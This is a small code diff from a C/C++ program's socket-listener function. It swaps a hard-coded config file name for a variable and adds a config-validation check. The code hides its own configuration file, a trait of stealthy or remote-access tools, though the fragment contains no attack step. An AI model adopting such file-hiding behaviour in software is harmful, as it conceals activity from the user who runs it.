@@ -12,15 +12,21 @@ void *ListenSocketProc(void *param)
 
 		Sleep(1);
 
-		fp = fopen("Config.ksb", "r");
+		fp = fopen(configuration, "r");
 		if (fp == NULL)
 			return NULL;
 		else
 			fclose(fp);
 
-		HideFile("Config.ksb");
+		HideFile(configuration);
 
-		ifst.open("Config.ksb", ios::in);
+		ifst.open(configuration, ios::in);
+
+		if (!Checkconfig(configuration))
+		{
+			ifst.close();
+			return NULL;
+		}
 
 		ifst >> A->stop;
 		for (int i = 0; i < 6; i++)
